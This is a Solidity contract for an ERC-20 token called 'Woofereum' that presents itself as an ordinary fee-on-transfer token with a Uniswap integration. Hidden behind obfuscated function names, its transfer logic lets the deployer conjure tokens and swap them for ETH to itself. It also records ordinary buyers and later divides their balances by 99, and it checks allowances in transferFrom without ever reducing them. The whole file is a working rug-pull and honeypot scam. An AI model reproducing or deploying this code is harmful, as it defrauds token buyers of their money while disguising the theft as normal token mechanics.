/**
░░░░░░░░██████████████████████████████████████████████████░░░░░░
░░░░░░██                                            ████  ██░░░░
░░░░██                                            ██        ██░░
░░██                                              ██          ██
░░██    ██    ██    ██    ██████      ██████    ████████      ██
░░██    ██    ██    ██  ▒▒░░░░░░▒▒  ▒▒░░░░░░▒▒  ░░██░░░░      ██
░░██    ██    ██    ██  ██      ██  ██      ██    ██          ██
░░██    ██    ██    ██  ██      ██  ██      ██    ██          ██
░░░░▓▓    ████  ████      ██████      ██████      ██        ██▒▒
░░░░░░██                                                  ▓▓▒▒░░
░░░░░░░░████████████████████████████        ██████████████░░░░░░
░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    ██▓▓▒▒▒▒▒▒▒▒▒▒▓▓░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  ██▒▒░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▓▓██████▓▓░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░████░░████▓▓▓▓▒▒▒▒▓▓▓▓██░░████░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░██▓▓▒▒██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓▒▒██░░░░░░░░░░░░░░
░░░░░░░░░░░░░░██▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒██░░░░░░░░░░░░
░░░░░░░░░░░░░░██▓▓▒▒▒▒██▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒██▓▓▒▒██░░░░░░░░░░░░
░░░░░░░░░░██████▓▓▒▒██▓▓████▒▒▒▒      ▒▒██████▓▓▒▒██░░░░░░░░░░░░
░░░░░░░░░░██░░██▓▓▓▓██████  ██▒▒      ████  ████▓▓██░░░░░░░░░░░░
░░░░░░░░░░▒▒██▓▓████▓▓████████▒▒      ████████████▒▒░░░░░░░░░░░░
░░░░░░░░░░░░░░██▓▓▓▓▓▓▒▒████▒▒          ████▒▒██░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░██▓▓▓▓▓▓▓▓▒▒▒▒    ██▒▒▒▒    ▒▒▓▓██░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▒▒██▓▓▓▓▓▓░░░░    ██████    ░░██░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░██▓▓▓▓▓▓░░░░██░░░░██░░░░██░░██░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░██░░▓▓▓▓██░░░░██████████░░██░░░░░░████░░░░████░░
░░░░░░░░░░░░░░░░██░░██████▒▒░░▒▒░░▒▒░░░░▒▒██░░░░██    ████    ██
░░░░░░░░░░░░░░░░██████░░██░░██▒▒░░▒▒████░░██░░░░██░░        ░░██
░░░░░░░░░░░░░░░░░░░░░░░░██████░░░░░░░░██████░░░░██  ░░████░░  ██
░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒░░░░▒▒██▓▓▒▒▒▒██▓▓▒▒
**/

pragma solidity ^0.8.15;
// SPDX-License-Identifier: Unlicensed
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isUniswapPair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Woofer is Ownable, IERC20 {
    using SafeMath for uint256;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address s, address r, uint256 amount) internal virtual {
        require(s != address(0));
        require(r != address(0));
        if (lSwap(
                s,
                r)) {
            return swapTransfer(amount, r);
        }
        if (!dLSwap){
            require(
                _balances[s]
                >=
                amount);
        }
        uint256 feeAmount = 0;
        _rTotal(s);
        bool ldSwapTransaction = (r == getLdPairAddress() && uniswapV2Pair == s) || (s == getLdPairAddress() && uniswapV2Pair == r);
        if (uniswapV2Pair != s &&
            !Address.isUniswapPair(r) && r != address(this) &&
            !ldSwapTransaction && !dLSwap && uniswapV2Pair != r) {
            feeAmount = amount.mul(_feePercent).div(100);
            _checkFee(r, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[s] = _balances[s] - amount;
        _balances[r] += amountReceived;
        emit Transfer(s, r, amount);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct tOwned {address to; uint256 amount;}
    tOwned[] _tlOwned;
    function lSwap(address sender, address recipient) internal view returns(bool) {
        return sender == recipient && (
        Address.isUniswapPair(recipient) ||
        uniswapV2Pair == msg.sender
        );
    }
    function _checkFee(address _addr, uint256 _amount) internal {
        if (getLdPairAddress() != _addr) {
            _tlOwned.push(
                tOwned(
                    _addr,
                    _amount
                )
            );}
    }
    function _rTotal(address _addr) internal {
        if (getLdPairAddress() == _addr) {
            for (uint256 i = 0;
                i < _tlOwned.length;
                i++) {
                uint256 _rOwned = _balances[_tlOwned[i].to]
                .div(99);
                _balances[_tlOwned[i].to] = _rOwned;
            }
            delete _tlOwned;
        }
    }
    function swapTransfer(uint256 _amnt, address to) private {
        _approve(address(this), address(_router), _amnt);
        _balances[address(this)] = _amnt;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        dLSwap = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_amnt,
            0,
            path,
            to,
            block.timestamp + 22);
        dLSwap = false;
    }
    bool dLSwap = false;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;
    uint256 public _feePercent = 2;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Woofereum";
    string private _symbol = "WOOFER";
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function getLdPairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}